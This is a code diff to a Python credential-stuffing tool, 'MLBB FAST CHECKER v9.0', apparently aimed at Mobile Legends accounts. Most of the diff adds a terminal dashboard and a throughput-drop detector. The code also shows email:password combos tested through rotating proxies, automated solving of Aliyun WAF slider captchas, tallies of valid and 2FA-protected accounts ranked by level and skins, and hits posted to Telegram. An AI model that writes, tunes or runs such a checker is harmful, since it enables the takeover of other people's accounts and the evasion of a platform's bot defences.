@@ -346,9 +346,119 @@ stats = {
 
 _TUI_ACTIVE = False
 _LAST_RENDER = 0.0
-_LIVE_LOGS = deque(maxlen=4)
+_LIVE_LOGS = deque(maxlen=14)
 _TOP_HITS = []
 _ANSI_RE = re.compile(r'\033\[[0-9;]*m')
+
+class _SpeedDetector:
+    """Rolling speed-drop detector with per-cause stall attribution (WAF / Proxy / Lock / Lookup / Retry)."""
+    _LABELS = {
+        'waf': ('WAF', 'Aliyun WAF/Slider'),
+        'proxy': ('PROXY', 'Proxy Lag/Timeout'),
+        'lock': ('LOCK', 'Tab/IPC/Gate Lock'),
+        'lookup': ('LOOKUP', 'Info/TG Lookup'),
+        'retry': ('RETRY', 'Retry Loop'),
+    }
+
+    def __init__(self, window_s: float = 30.0):
+        self.window_s = window_s
+        self.reset()
+
+    def reset(self, now_t: float | None = None):
+        t = time.monotonic() if now_t is None else now_t
+        self.start_t = t
+        self.last_check_t = t
+        self.last_alert_t = 0.0
+        self.pause_until_t = 0.0
+        self.total_checks = 0
+        self.peak_rate = 0.0
+        self.was_drop = False
+        self.samples: deque[float] = deque()
+        self.stalls: deque[tuple[float, str, float]] = deque()
+        self.totals: dict[str, float] = {k: 0.0 for k in self._LABELS}
+
+    def resume(self, now_t: float | None = None):
+        t = time.monotonic() if now_t is None else now_t
+        self.last_check_t = t
+        self.pause_until_t = t + 12.0
+        self.was_drop = False
+
+    def _prune(self, now_t: float):
+        cut = now_t - self.window_s
+        while self.samples and self.samples[0] < cut:
+            self.samples.popleft()
+        while self.stalls and self.stalls[0][0] < cut:
+            self.stalls.popleft()
+
+    def mark_check(self, now_t: float | None = None):
+        t = time.monotonic() if now_t is None else now_t
+        self.total_checks += 1
+        self.last_check_t = t
+        self.samples.append(t)
+        self._prune(t)
+        if len(self.samples) >= 6:
+            span = t - self.samples[0]
+            if span >= 10.0:
+                self.peak_rate = max(self.peak_rate, len(self.samples) / span)
+
+    def record_stall(self, kind: str, dur_s: float, now_t: float | None = None):
+        if dur_s < 0.25 or kind not in self.totals:
+            return
+        t = time.monotonic() if now_t is None else now_t
+        self.stalls.append((t, kind, dur_s))
+        self.totals[kind] += dur_s
+        self._prune(t)
+
+    def _dominant(self, by_kind: dict[str, float]) -> tuple[str, str, int]:
+        tot = sum(by_kind.values())
+        if tot < 1.5:
+            return 'SLOW', 'Throughput Rendah', 0
+        k, v = max(by_kind.items(), key=lambda kv: kv[1])
+        tag, desc = self._LABELS.get(k, ('SLOW', 'Throughput Rendah'))
+        return tag, desc, int(v * 100 / tot)
+
+    def evaluate(self, now_t: float | None = None) -> tuple[bool, str, str, int, float, float]:
+        t = time.monotonic() if now_t is None else now_t
+        self._prune(t)
+        elapsed = max(t - self.start_t, 0.0)
+        idle_s = max(t - self.last_check_t, 0.0)
+        # ponytail: 12s recent window detects drops fast & clears immediately after recovery instead of waiting 30s
+        recent_span = min(12.0, max(elapsed, 1.0))
+        recent_cut = t - 12.0
+        recent_cnt = sum(1 for ts in self.samples if ts >= recent_cut)
+        cur_rate = 0.0 if idle_s >= 15.0 else (recent_cnt / max(recent_span, 10.0))
+        warmed = self.total_checks >= 6 and elapsed >= 12.0 and self.peak_rate > 0 and t >= self.pause_until_t
+        is_drop = warmed and (cur_rate < self.peak_rate * 0.55 or (idle_s >= 12.0 and stats.get('workers', 0) > 0))
+        win_totals = {}
+        for _, k, d in self.stalls:
+            win_totals[k] = win_totals.get(k, 0.0) + d
+        tag, desc, pct = self._dominant(win_totals)
+        return is_drop, tag, desc, pct, cur_rate, self.peak_rate
+
+    def maybe_alert(self, now_t: float | None = None) -> str | None:
+        t = time.monotonic() if now_t is None else now_t
+        is_drop, tag, desc, pct, cur_r, peak_r = self.evaluate(t)
+        if is_drop:
+            if not self.was_drop or (t - self.last_alert_t) >= 25.0:
+                self.was_drop = True
+                self.last_alert_t = t
+                drop_pct = max(0, min(99, int((1.0 - cur_r / max(peak_r, 0.01)) * 100)))
+                why = f"{desc} {pct}%" if pct else desc
+                msg = f"DROP -{drop_pct}% ({cur_r:.2f} vs {peak_r:.2f}/s) -> {why}"
+                _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}{msg[:54]}{W}")
+                return msg
+        elif self.was_drop and self.peak_rate > 0 and cur_r >= self.peak_rate * 0.72:
+            self.was_drop = False
+        return None
+
+    def summary(self) -> str:
+        tot = sum(self.totals.values())
+        if tot < 3.0:
+            return ""
+        parts = [f"{self._LABELS[k][0]} {int(v * 100 / tot)}%" for k, v in sorted(self.totals.items(), key=lambda kv: -kv[1]) if v >= 1.0][:2]
+        return " | ".join(parts)
+
+_PERF = _SpeedDetector()
 
 def _fmt_bytes(b: int) -> str:
     if b < 1024: return f"{b} B"
@@ -421,121 +531,215 @@ def render_dashboard(force: bool = False):
     _LAST_RENDER = now_t
 
     term_cols, term_rows = shutil.get_terminal_size((80, 24))
-    W_OUT = max(40, min(68, term_cols - 1))
+    W_OUT = max(40, min(92, term_cols - 1))
     W_IN = W_OUT - 4
+    BC = GRAY  # sleek slate/gray border matching HESU layout
+    D_DIA, D_DOT, D_TRI, D_CDIA, D_SQ = ('◆', '●', '▸', '◇', '▬') if _UTF_OK else ('*', '*', '>', 'o', '=')
+
     el = int(max(now_t - stats['start'], 0))
     el_str = f"{el // 3600}:{(el % 3600) // 60:02d}:{el % 60:02d}"
+    el_short = f"{el // 3600}h {el % 3600 // 60:02d}m" if el >= 3600 else f"{el // 60}m {el % 60:02d}s"
     ck, tot = stats['checked'], stats['total']
     rate = ck / max(now_t - stats['start'], 0.001)
+    cpm = int(rate * 60)
     pct = (ck / tot * 100) if tot else 0.0
+    rem = max(0, tot - ck)
+    if rate > 0.05 and rem > 0:
+        eta_s = int(rem / rate)
+        eta_str = f"{eta_s // 3600}h {eta_s % 3600 // 60:02d}m" if eta_s >= 3600 else f"{eta_s // 60}m {eta_s % 60:02d}s"
+    elif rem == 0 and tot > 0:
+        eta_str = "0m 00s"
+    else:
+        eta_str = "--"
 
     st = stats['status']
+    if st == 'RUNNING':
+        _PERF.maybe_alert()
+    is_drop, drop_tag, _, _, _, _ = _PERF.evaluate()
+    clock_str = now()[11:]
     if st == 'WAF_WAIT':
-        badge = "\033[41;97m ! WAF / ROTATE \033[0m" if _COLOR_OK else "[! WAF]"
+        st_txt = f"{c(RED)}{D_DOT} WAF WAIT{W}"
+        net_txt = f"{c(RED)}WAF ROTATE{W}"
     elif st == 'REFRESH':
-        badge = f"\033[46;30m {stats.get('refresh_label', '~ REFRESH 1K')} \033[0m" if _COLOR_OK else "[~ REFRESH]"
+        st_txt = f"{c(CYAN)}{D_DOT} REFRESH 1K{W}"
+        net_txt = f"{c(CYAN)}RELOADING{W}"
     elif st == 'DONE':
-        badge = "\033[42;30m + FINISHED \033[0m" if _COLOR_OK else "[+ DONE]"
+        st_txt = f"{c(GREEN)}{D_DOT} FINISHED{W}"
+        net_txt = f"{c(GREEN)}DONE{W}"
+    elif is_drop:
+        st_txt = f"{c(GOLD)}{D_DOT} DROP:{drop_tag}{W}"
+        net_txt = f"{c(GOLD)}DROP:{drop_tag}{W}"
     else:
-        badge = "\033[42;30m * RUNNING \033[0m" if _COLOR_OK else "[* RUN]"
+        st_txt = f"{c(GREEN)}{D_DOT} ACTIVE{W}"
+        net_txt = f"{c(GREEN)}HEALTHY{W}"
 
-    bar_w = max(8, min(34, W_IN - 30))
-    filled = int(pct / 100 * bar_w)
-    pbar = f"{c(RED)}{BAR_F * filled}{c(GRAY)}{BAR_E * (bar_w - filled)}{W}"
-    prog_str = f" {pbar} {c(GOLD)}{pct:5.1f}%{W} {c(WHITE)}{ck:,}/{tot:,}{W} {c(CYAN)}{rate:.1f}/s{W}"
-
-    out_lines = []
-    title = (
-        f" * {c(PURPLE)}{BD}MLBB FAST CHECKER v9.0{W} {c(CYAN)}{stats.get('engine_label', '@BrowserEngine')}{W} * "
-        if W_OUT >= 54 else
-        f" {c(PURPLE)}{BD}MLBB CHECKER v9.0{W} "
-    )
-    title = _clip_ansi(title, W_OUT - 4)
-    tl = _vis_len(title)
-    top_inner = W_OUT - 2
-    left_d = max(0, (top_inner - tl) // 2)
-    right_d = max(0, top_inner - tl - left_d)
-    out_lines.append(f"{c(RED)}{BT}{BH * left_d}{title}{c(RED)}{BH * right_d}{BTR}{W}")
-
-    # Row 1: Elapsed | Workers | Status
     w_live, w_tot = stats['workers'], stats.get('workers_total', stats['workers'])
-    hdr_left = _pad(f" {c(WHITE)}elapsed {el_str}{W}  {c(GREEN)}* {w_live}/{w_tot} workers{W}", max(1, W_IN - _vis_len(badge)))
-    out_lines.append(_box_line(f"{hdr_left}{badge}", W_OUT))
-
-    # Row 2: Compact Proxy + Real-Time Quota
+    streams = w_live * (2 if TWO_TAB else 1)
     q_str = _fmt_bytes(stats['bytes_used'])
-    px_max = max(8, W_IN - 32)
-    px_txt = f" {c(GRAY)}Proxy:{W} {c(CYAN)}{stats['proxy_label'][:px_max]}{W} {c(GRAY)}{BV} CTX:{W} {c(PURPLE)}{stats['proxy_ctx']}{W} {c(GRAY)}{BV} Quota:{W} {c(GOLD)}{q_str}{W}"
-    out_lines.append(_box_line(px_txt, W_OUT))
+    mode_tag = f"{'2-Tab' if TWO_TAB else '1-Tab'} {'Proxy' if PROXY_ENABLED else 'Direct'}"
 
-    # Row 3: Progress box
-    out_lines.append(_box_line(f"{c(GOLD)}{ST}{BH * (W_IN - 2)}{STR}{W}", W_OUT))
-    out_lines.append(_box_line(f"{c(GOLD)}{BV}{W}{_pad(prog_str, W_IN - 2)}{c(GOLD)}{BV}{W}", W_OUT))
-    out_lines.append(_box_line(f"{c(GOLD)}{SBL}{BH * (W_IN - 2)}{SBR}{W}", W_OUT))
+    out_lines = [f"{c(BC)}{BT}{BH * (W_OUT - 2)}{BTR}{W}"]
 
-    # Row 4: Stats (2-col on W_OUT >= 62, compact 1-col on narrow terminals)
-    if W_OUT >= 62:
-        LW = 29
-        RW = W_IN - LW - 1
-        l_title = f"- {c(CYAN)}STATS{W}{c(PURPLE)} -"
-        r_title = f"- {c(CYAN)}TIER / PEAK{W}{c(PURPLE)} -"
-        ld_r = max(1, LW - 8 - _vis_len('- STATS -'))
-        rd_r = max(1, RW - 8 - _vis_len('- TIER / PEAK -'))
-        out_lines.append(_box_line(
-            f"{c(PURPLE)}{ST}{BH * 6}{l_title}{BH * ld_r}{STR}{W} "
-            f"{c(PURPLE)}{ST}{BH * 6}{r_title}{BH * rd_r}{STR}{W}", W_OUT
-        ))
-        stat_rows = [
-            (f" {c(GRAY)}TOTAL{W}",     f"{c(WHITE)}{ck:,}{W}",                f" {c(GRAY)}MYTHIC+{W}",    f"{c(GOLD)}{stats['rank_mythic']}{W}"),
-            (f" {c(GRAY)}VALID{W}",     f"{c(GREEN)}{stats['valid']:,}{W}",     f" {c(GRAY)}LEGEND/EPIC{W}",f"{c(PURPLE)}{stats['rank_legend']}/{stats['rank_epic']}{W}"),
-            (f" {c(GRAY)}INVALID{W}",   f"{c(RED)}{stats['invalid']:,}{W}",     f" {c(GRAY)}WAF SOLVE{W}",  f"{c(CYAN)}{stats['waf_solved']:,}{W}"),
-            (f" {c(GRAY)}2FA / OTP{W}", f"{c(GOLD)}{stats['otp']:,}{W}",        f" {c(GRAY)}WAF HITS{W}",   f"{c(PURPLE)}{stats['waf']:,}{W}"),
-            (f" {c(GRAY)}ERROR{W}",     f"{c(GRAY)}{stats['error']:,}{W}",      f" {c(GRAY)}PEAK SKINS{W}", f"{c(GOLD)}{stats['peak_skins'] or 'N/A'}{W}"),
+    # Header bar: ◆ MLBB v9.0 - @Cloak     ● ACTIVE   18:05:27
+    hdr_r = f"{st_txt}   {c(GRAY)}{clock_str}{W}" if W_IN >= 48 else st_txt
+    hdr_l = _pad(
+        f"{c(WHITE)}{D_DIA} {BD}MLBB v9.0{W} {c(GRAY)}-{W} {c(CYAN)}{stats.get('engine_label', '@Cloak')}{W}",
+        max(1, W_IN - _vis_len(hdr_r)),
+    )
+    out_lines.append(_box_line(f"{hdr_l}{hdr_r}", W_OUT, BC))
+
+    # Top 5-column KPI strip on spacious terminals (matching HESU header cards)
+    v_rate_ck = (stats['valid'] / ck * 100) if ck else 0.0
+    o_rate_ck = (stats['otp'] / ck * 100) if ck else 0.0
+    if W_OUT >= 74 and term_rows >= 29:
+        kw = W_IN - 2
+        col_w = (kw - 4) // 5
+        rem_pad = kw - (col_w * 5 + 4)
+        sep = f"{c(GRAY)}{BV}{W}"
+        def _kpi_row(vals):
+            cells = []
+            for idx, (val, col) in enumerate(vals):
+                cw = col_w + (rem_pad if idx == 4 else 0)
+                vis = _vis_len(val)
+                lp = max(0, (cw - vis) // 2)
+                cells.append(f"{c(col)}{' ' * lp}{val}{' ' * max(0, cw - vis - lp)}{W}")
+            return _box_line(f"{c(GRAY)}{BV}{W}{sep.join(cells)}{c(GRAY)}{BV}{W}", W_OUT, BC)
+
+        out_lines.append(_box_line(f"{c(GRAY)}{ST}{BH * kw}{STR}{W}", W_OUT, BC))
+        out_lines.append(_kpi_row([
+            (f"{BD}{ck:,}", WHITE),
+            (f"{BD}{stats['valid']:,}", GREEN),
+            (f"{BD}{stats['otp']:,}", GOLD),
+            (f"{BD}{rate:.1f}/s", WHITE),
+            (f"{BD}{w_live}/{w_tot}", WHITE),
+        ]))
+        out_lines.append(_kpi_row([
+            ("PROCESSED", GRAY), ("VALID", GRAY), ("2FA / OTP", GRAY), ("RATE", GRAY), ("WORKERS", GRAY),
+        ]))
+        out_lines.append(_kpi_row([
+            (f"of {tot:,}", GRAY),
+            (f"{v_rate_ck:.1f}%", GOLD),
+            (f"{o_rate_ck:.1f}% of chk", GRAY),
+            (f"ETA {eta_str}", CYAN),
+            (mode_tag, GRAY),
+        ]))
+        out_lines.append(_box_line(f"{c(GRAY)}{SBL}{BH * kw}{SBR}{W}", W_OUT, BC))
+
+    # Full-width Progress bar line: PROGRESS 72.1% ████████░░░░░ 768/1,065 ETA 1m 57s
+    p_right = f" {c(WHITE)}{ck:,}/{tot:,}{W}" + (f"  {c(GRAY)}ETA{W} {c(CYAN)}{eta_str}{W}" if W_OUT >= 62 else "")
+    p_left = f"{c(GRAY)}PROGRESS{W} {c(WHITE)}{BD}{pct:5.1f}%{W} " if W_OUT >= 52 else f"{c(GOLD)}{pct:5.1f}%{W} "
+    bar_w = max(6, W_IN - _vis_len(p_left) - _vis_len(p_right))
+    filled = int(pct / 100 * bar_w)
+    pbar = f"{c(GREEN)}{BAR_F * filled}{c(GRAY)}{BAR_E * (bar_w - filled)}{W}"
+    out_lines.append(_box_line(f"{p_left}{pbar}{p_right}", W_OUT, BC))
+
+    # 2-Column Body when W_OUT >= 68 and term_rows >= 20
+    if W_OUT >= 68 and term_rows >= 20:
+        LW = max(32, min(42, (W_IN - 3) // 2))
+        RW = W_IN - LW - 3
+        sep_col = f" {c(GRAY)}{BV}{W} "
+
+        def _row2(l_txt: str, r_txt: str):
+            out_lines.append(_box_line(f"{_pad(l_txt, LW)}{sep_col}{_pad(r_txt, RW)}", W_OUT, BC))
+
+        def _div2():
+            out_lines.append(_box_line(f"{c(GRAY)}{BH * LW} {BV} {BH * RW}{W}", W_OUT, BC))
+
+        _div2()
+        _row2(f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}ACCOUNT RESULTS{W}", f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}SYSTEM{W}")
+        i_pct = (stats['invalid'] / ck * 100) if ck else 0.0
+        e_pct = (stats['error'] / ck * 100) if ck else 0.0
+        px_short = stats['proxy_label'][:max(8, RW - 14)]
+
+        top_pairs = [
+            (f" {c(GREEN)}{D_TRI} Valid{W}",     f"{c(GREEN)}{stats['valid']:>5,}{W}  {c(GRAY)}({v_rate_ck:4.1f}%){W}",
+             f" {c(CYAN)}{D_CDIA} Workers{W}",  f"{c(CYAN)}{w_live}/{w_tot}{W} {c(GRAY)}({streams} st){W}"),
+            (f" {c(RED)}{D_TRI} Invalid{W}",     f"{c(RED)}{stats['invalid']:>5,}{W}  {c(GRAY)}({i_pct:4.1f}%){W}",
+             f" {c(RED)}{D_DOT} Net/Perf{W}",   net_txt),
+            (f" {c(GOLD)}{D_DIA} 2FA / OTP{W}",  f"{c(GOLD)}{stats['otp']:>5,}{W}  {c(GRAY)}({o_rate_ck:4.1f}%){W}",
+             f" {c(GREEN)}{D_TRI} Speed{W}",    f"{c(GREEN)}{rate:.1f}/s{W}"),
+            (f" {c(GRAY)}{D_CDIA} Error{W}",     f"{c(GRAY)}{stats['error']:>5,}{W}  {c(GRAY)}({e_pct:4.1f}%){W}",
+             f" {c(GOLD)}{D_DIA} CPM{W}",       f"{c(GOLD)}{cpm:,}{W}"),
+            (f" {c(PURPLE)}{D_DOT} WAF Hits{W}", f"{c(PURPLE)}{stats['waf']:>5,}{W}  {c(GRAY)}({stats['waf_solved']:,} ok){W}",
+             f" {c(CYAN)}{D_CDIA} Elapsed{W}",  f"{c(WHITE)}{el_short}{W}"),
+            (f" {c(CYAN)}o Contexts{W}",         f"{c(WHITE)}{stats['proxy_ctx']:>5,}{W}  {c(GOLD)}{q_str}{W}",
+             f" {c(GRAY)}o Proxy{W}",           f"{c(CYAN)}{px_short}{W}"),
         ]
-        for lk, lv, rk, rv in stat_rows:
-            l_cell = _pad(f"{_pad(lk, 16)}{lv}", LW - 2)
-            r_cell = _pad(f"{_pad(rk, 17)}{rv}", RW - 2)
-            out_lines.append(_box_line(f"{c(PURPLE)}{BV}{W}{l_cell}{c(PURPLE)}{BV}{W} {c(PURPLE)}{BV}{W}{r_cell}{c(PURPLE)}{BV}{W}", W_OUT))
-        out_lines.append(_box_line(f"{c(PURPLE)}{SBL}{BH * (LW - 2)}{SBR}{W} {c(PURPLE)}{SBL}{BH * (RW - 2)}{SBR}{W}", W_OUT))
+        # Reserve space if terminal height is tight (e.g. 80x24 shows 5 pairs cleanly)
+        max_top = 6 if (term_rows - len(out_lines) - 10) >= 6 else 5
+        for lk, lv, rk, rv in top_pairs[:max_top]:
+            _row2(f"{_pad(lk, 14)}{lv}", f"{_pad(rk, 14)}{rv}")
+
+        # Remaining rows for Bottom Left (TIERS & PEAKS + TOP HITS) and Bottom Right (LIVE FEED)
+        avail_bot = term_rows - len(out_lines) - 2  # 1 divider + 1 bottom border
+        if avail_bot >= 5:
+            _div2()
+            # Build Left Bottom rows dynamically to fit avail_bot
+            rm, rl, re_, ro = stats['rank_mythic'], stats['rank_legend'], stats['rank_epic'], stats['rank_other']
+            r_tot = max(1, rm + rl + re_ + ro)
+            def _tier_bar(lbl, cnt, col):
+                tp = cnt / r_tot * 100 if (rm + rl + re_ + ro) else 0.0
+                bw = max(1, min(10, int(round(tp / 10.0)))) if cnt else 0
+                return f" {c(col)}{lbl:<10}{W}{c(WHITE)}{cnt:>3}{W} {c(GRAY)}({tp:4.1f}%){W} {c(col)}{D_SQ * bw}{W}"
+
+            l_rows = [f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}TIERS & PEAKS{W}"]
+            l_rows.extend([
+                _tier_bar("Mythic+", rm, GREEN),
+                _tier_bar("Legend", rl, GOLD),
+                _tier_bar("Epic", re_, PURPLE),
+                _tier_bar("Other", ro, RED),
+            ])
+            if avail_bot >= 9:
+                l_rows.extend([
+                    f"{_pad(f' {c(GOLD)}{D_DIA} Peak Skins{W}', 17)}{c(GOLD)}{stats['peak_skins'] or 0}{W}",
+                    f"{_pad(f' {c(GREEN)}{D_DIA} Peak Level{W}', 17)}{c(GREEN)}Lv {stats['peak_lvl'] or 0}{W}",
+                    f"{_pad(f' {c(GRAY)}o WAF Solved{W}', 17)}{c(WHITE)}{stats['waf_solved']}/{stats['waf']}{W}",
+                ])
+            if avail_bot >= 11:
+                l_rows.append(f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}TOP HITS{W}")
+                hits_room = max(1, min(3, avail_bot - len(l_rows)))
+                if not _TOP_HITS:
+                    l_rows.append(f" {c(GRAY)}No valid hits yet{W}")
+                else:
+                    for h_ln in _TOP_HITS[:hits_room]:
+                        l_rows.append(f" {h_ln}")
+
+            l_rows = l_rows[:avail_bot]
+            feed_cap = max(len(l_rows), min(avail_bot, max(5, len(_LIVE_LOGS) + 1)))
+            feed_logs = list(_LIVE_LOGS)[-(feed_cap - 1):]
+            r_rows = [f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}LIVE FEED{W}"] + feed_logs
+            n_bot = max(len(l_rows), len(r_rows))
+            n_bot = min(avail_bot, n_bot)
+            for idx_b in range(n_bot):
+                lt = l_rows[idx_b] if idx_b < len(l_rows) else ""
+                rt = r_rows[idx_b] if idx_b < len(r_rows) else ""
+                _row2(lt, rt)
     else:
+        # Compact single-column fallback for narrow/short terminals (<68w or <20h)
         out_lines.append(_box_line(
-            f" {c(GREEN)}OK:{stats['valid']}{W} {c(RED)}INV:{stats['invalid']}{W} "
-            f"{c(GOLD)}2FA:{stats['otp']}{W} {c(GRAY)}ERR:{stats['error']}{W}", W_OUT
+            f"{c(GREEN)}OK:{stats['valid']}{W} {c(RED)}INV:{stats['invalid']}{W} "
+            f"{c(GOLD)}2FA:{stats['otp']}{W} {c(GRAY)}ERR:{stats['error']}{W} {c(CYAN)}{rate:.1f}/s{W}",
+            W_OUT, BC,
         ))
         out_lines.append(_box_line(
-            f" {c(GOLD)}MYT:{stats['rank_mythic']}{W} {c(PURPLE)}WAF:{stats['waf_solved']}/{stats['waf']}{W} "
-            f"{c(GOLD)}SKIN:{stats['peak_skins'] or 0}{W}", W_OUT
+            f"{c(GOLD)}MYT:{stats['rank_mythic']}{W} {c(PURPLE)}WAF:{stats['waf_solved']}/{stats['waf']}{W} "
+            f"{c(CYAN)}CTX:{stats['proxy_ctx']}{W} {c(GOLD)}{q_str}{W}",
+            W_OUT, BC,
         ))
+        avail_c = term_rows - len(out_lines) - 1
+        if avail_c >= 3 and _TOP_HITS:
+            out_lines.append(_box_line(f"{c(GOLD)}HIT:{W} {_TOP_HITS[0]}", W_OUT, BC))
+            avail_c -= 1
+        if avail_c >= 3:
+            out_lines.append(_box_line(f"{c(GRAY)}{BV}{W} {c(WHITE)}{BD}LIVE FEED{W}", W_OUT, BC))
+            avail_c -= 1
+            for entry in list(_LIVE_LOGS)[-min(3, avail_c):]:
+                out_lines.append(_box_line(entry, W_OUT, BC))
 
-    # Adapt TOP HITS and LIVE LOG row count to terminal height so frame never scrolls
-    avail_rows = term_rows - len(out_lines) - 2
-    show_top = bool(_TOP_HITS) and avail_rows >= 3 or avail_rows >= 7
-    if show_top:
-        th_title = f" {c(GOLD)}TOP HITS{W} "
-        th_d = max(1, (W_IN - 2 - _vis_len(" TOP HITS ")) // 2)
-        th_r = max(1, W_IN - 2 - th_d - _vis_len(" TOP HITS "))
-        out_lines.append(_box_line(f"{c(GOLD)}{ST}{BH * th_d}{th_title}{c(GOLD)}{BH * th_r}{STR}{W}", W_OUT))
-        if not _TOP_HITS:
-            pad_c = ' ' * max(0, (W_IN - 2 - 17) // 2)
-            out_lines.append(_box_line(f"{c(GOLD)}{BV}{W}{_pad(pad_c + c(GRAY) + 'No valid hits yet' + W, W_IN - 2)}{c(GOLD)}{BV}{W}", W_OUT))
-        else:
-            out_lines.append(_box_line(f"{c(GOLD)}{BV}{W}{_pad(' ' + _TOP_HITS[0], W_IN - 2)}{c(GOLD)}{BV}{W}", W_OUT))
-        out_lines.append(_box_line(f"{c(GOLD)}{SBL}{BH * (W_IN - 2)}{SBR}{W}", W_OUT))
-        avail_rows -= 3
-
-    log_rows = max(0, min(4, avail_rows - 2))
-    if log_rows > 0:
-        ll_title = f" {c(PURPLE)}LIVE LOG{W} "
-        ll_d = max(1, (W_IN - 2 - _vis_len(" LIVE LOG ")) // 2)
-        ll_r = max(1, W_IN - 2 - ll_d - _vis_len(" LIVE LOG "))
-        out_lines.append(_box_line(f"{c(PURPLE)}{ST}{BH * ll_d}{ll_title}{c(PURPLE)}{BH * ll_r}{STR}{W}", W_OUT))
-        log_snapshot = list(_LIVE_LOGS)[-log_rows:]
-        for row_i in range(log_rows):
-            entry = log_snapshot[row_i] if row_i < len(log_snapshot) else ""
-            out_lines.append(_box_line(f"{c(PURPLE)}{BV}{W}{_pad(entry, W_IN - 2)}{c(PURPLE)}{BV}{W}", W_OUT))
-        out_lines.append(_box_line(f"{c(PURPLE)}{SBL}{BH * (W_IN - 2)}{SBR}{W}", W_OUT))
-
-    out_lines.append(f"{c(RED)}{BBL}{BH * (W_OUT - 2)}{BBR}{W}")
+    out_lines.append(f"{c(BC)}{BBL}{BH * (W_OUT - 2)}{BBR}{W}")
+    # ponytail: hard height cap ensures frame never scrolls even on tiny terminals
+    if len(out_lines) > term_rows:
+        out_lines = out_lines[:max(2, term_rows - 1)] + [out_lines[-1]]
 
     out_buf = "\033[H" + "\n".join(ln + "\033[K" for ln in out_lines) + "\033[J"
     try:
@@ -545,20 +749,22 @@ def render_dashboard(force: bool = False):
         pass
 
 def print_progress():
+    if not _TUI_ACTIVE:
+        alert = _PERF.maybe_alert()
+        if alert:
+            p_out(f"  {c(GOLD)}[PERF] {alert}{W}")
     render_dashboard()
 
 def print_result(rtype, email, password, msg=""):
     idx = stats['checked']
     msg = str(msg or '').replace('\r', ' ').replace('\n', ' ').strip()
-    acc = f"{email}:{password}"
-    if len(acc) > 26:
-        acc = acc[:23] + "..."
+    acc = email if len(email) <= 15 else (email[:12] + "...")
     if rtype == "INVALID":
-        _LIVE_LOGS.append(f" {c(GRAY)}{idx:>4}{W}  {c(RED)}{S_ERR}{W}  {c(GRAY)}{_pad(acc, 26)}{W} {c(RED)}{msg[:22]}{W}")
+        _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(RED)}{S_ERR}{W} {c(GRAY)}{_pad(acc, 15)}{W} {c(RED)}{msg[:18]}{W}")
     elif rtype == "OTP":
-        _LIVE_LOGS.append(f" {c(GRAY)}{idx:>4}{W}  {c(GOLD)}{S_STAR}{W}  {c(WHITE)}{_pad(acc, 26)}{W} {c(GOLD)}2FA {msg[:18]}{W}")
+        _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(GOLD)}{S_STAR}{W} {c(WHITE)}{_pad(acc, 15)}{W} {c(GOLD)}2FA {msg[:14]}{W}")
     elif rtype in ("ERR", "WAF", "ERROR"):
-        _LIVE_LOGS.append(f" {c(GRAY)}{idx:>4}{W}  {c(GRAY)}!{W}  {c(GRAY)}{_pad(acc, 26)}{W} {c(GRAY)}{(msg or 'Timeout')[:22]}{W}")
+        _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(GRAY)}!{W} {c(GRAY)}{_pad(acc, 15)}{W} {c(GRAY)}{(msg or 'Timeout')[:18]}{W}")
     if not _TUI_ACTIVE:
         p_out(f"  [{rtype}] {email}:{password} -> {msg}")
     else:
@@ -591,12 +797,11 @@ def print_hit(email, password, d, info=None):
         skins = 0
 
     tier_label = ci.get('collector_tier', '') or 'VALID'
-    acc = f"{email}:{password}"
-    if len(acc) > 26:
-        acc = acc[:23] + "..."
+    acc = email if len(email) <= 15 else (email[:12] + "...")
     detail = f"Lv{lvl} {skins}Skins" if (lvl or skins) else tier_label
-    _LIVE_LOGS.append(f" {c(GRAY)}{idx:>4}{W}  {c(GREEN)}{S_OK}{W}  {c(GREEN)}{_pad(acc, 26)}{W} {c(GREEN)}{detail[:26]}{W}")
-    _TOP_HITS.insert(0, f"{c(GREEN)}{email}:{password}{W} {c(GOLD)}{BV} Lv{lvl} {BV} {skins} Skins {BV} {rank or tier_label}{W}")
+    _LIVE_LOGS.append(f"{c(GRAY)}{idx:>3}{W} {c(GREEN)}{S_OK}{W} {c(WHITE)}{_pad(acc, 15)}{W} {c(GOLD)}{detail[:18]}{W}")
+    u_short = email if len(email) <= 14 else (email[:11] + "...")
+    _TOP_HITS.insert(0, f"{c(CYAN)}Lv{lvl:<3}{W} {c(WHITE)}{_pad(u_short, 14)}{W} {c(GOLD)}{skins}Sk {(rank or tier_label)[:7]}{W}")
     del _TOP_HITS[5:]
 
     if not _TUI_ACTIVE:
@@ -684,7 +889,9 @@ async def send_tg(text: str):
         def _post_tg():
             with urllib.request.urlopen(req, timeout=8) as r:
                 r.read()
+        _t0 = time.monotonic()
         await loop.run_in_executor(None, _post_tg)
+        _PERF.record_stall('lookup', time.monotonic() - _t0)
     except Exception:
         pass
 
@@ -1325,6 +1532,13 @@ async def _human_drag(page, ctx, sx, sy, dist):
         return False
 
 async def solve_waf(page, ctx) -> bool:
+    t0 = time.monotonic()
+    try:
+        return await _solve_waf_impl(page, ctx)
+    finally:
+        _PERF.record_stall('waf', time.monotonic() - t0)
+
+async def _solve_waf_impl(page, ctx) -> bool:
     has = False
     try:
         has = await page.evaluate("""() => {
@@ -1735,10 +1949,16 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
                 return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
 
         # Event-driven wait up to 12s (wakes immediately on fast JSON, 405 WAF, or HTTP 407/429/5xx)
+        t_resp0 = time.monotonic()
         try:
             await asyncio.wait_for(resp_event.wait(), timeout=12.0)
         except asyncio.TimeoutError:
             pass
+        _wait_dt = time.monotonic() - t_resp0
+        if api_result["had_waf"]:
+            _PERF.record_stall('waf', _wait_dt)
+        elif api_result["proxy_err"] or _wait_dt >= 5.0:
+            _PERF.record_stall('proxy', _wait_dt)
         if api_result["proxy_407"] and not api_result["json"]:
             return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
         if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
@@ -1808,8 +2028,8 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, w
